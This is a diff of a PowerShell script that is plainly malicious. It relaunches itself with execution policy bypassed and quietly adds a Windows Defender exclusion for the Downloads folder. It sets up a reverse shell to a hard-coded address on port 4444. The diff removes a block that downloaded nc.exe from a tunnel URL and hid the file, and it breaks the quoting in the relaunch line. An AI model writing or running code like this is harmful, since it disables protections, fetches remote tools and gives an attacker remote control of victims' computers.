@@ -1,7 +1,7 @@
 function Ensure-WindowsPowerShell {
     if ($PSVersionTable.PSEdition -ne 'Desktop') {
         $script = $MyInvocation.MyCommand.Definition
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File "$script""
         exit
     }
 }
@@ -12,20 +12,6 @@ try {
     # Attempt Defender Exclusion (will fail silently if not admin)
     Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
 
-    # === Download nc.exe from localhost.run ===
-    $ncUrl = "https://03ce78442ce484.lhr.life/nc.exe"  # Replace with your actual localhost.run URL
-    $ncPath = "$env:USERPROFILE\Downloads\nc.exe"
-
-    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing
-
-    Unblock-File -Path $ncPath
-    Set-ItemProperty -Path $ncPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-}
-catch {
-    Write-Error "Execution failed: $_"
-}
-
-try {
     # === Reverse shell setup ===
     $client = "192.168.0.114"
     $port = 4444
